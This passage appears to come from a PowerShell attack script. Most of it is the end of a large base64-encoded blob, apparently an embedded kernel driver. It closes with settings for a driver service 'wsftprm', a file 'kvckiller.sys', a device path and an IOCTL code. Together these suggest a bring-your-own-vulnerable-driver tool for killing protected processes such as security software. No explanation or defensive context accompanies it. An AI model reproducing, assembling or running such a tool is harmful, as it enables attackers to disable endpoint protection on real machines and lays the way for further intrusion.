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
'@


$DRV_SERVICE = 'wsftprm'
$DRV_FILENAME = 'kvckiller.sys'
$DRV_DEVICE = '\\.\Warsaw_PM'
$DRV_IOCTL = 0x22201C
